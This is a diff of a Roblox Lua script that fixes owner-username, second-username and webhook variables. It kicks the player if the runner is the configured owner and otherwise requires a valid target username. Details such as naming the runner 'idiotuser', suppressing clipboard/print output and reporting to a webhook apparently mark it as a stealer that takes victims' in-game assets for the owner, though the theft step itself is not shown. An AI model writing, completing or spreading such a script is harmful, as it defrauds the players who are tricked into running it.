@@ -61,31 +61,31 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = _G.UserName
+    UserName = UserName
 end
 if UserName2 == nil then
-    UserName2 = _G.UserName2
+    UserName2 = UserName2
 end
 if Webhook == nil then
-    Webhook = _G.Webhook
+    Webhook = Webhook
 end
 -- User Checks
 
 local idiotuser = game:GetService("Players").LocalPlayer.Name
 
-if idiotuser == Username then
+if idiotuser == UserName then
     game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
     return;
 end
-if Username == nil then
-    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A Username")
     return;
 end
 local worked2 = pcall(function()
     game:GetService("Players"):GetUserIdFromNameAsync(Username)
 end)
 if not worked2 then
-    game:GetService("Players").LocalPlayer:Kick("Put A Valid UserName!")
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
     return;
 end
 if worked2 then
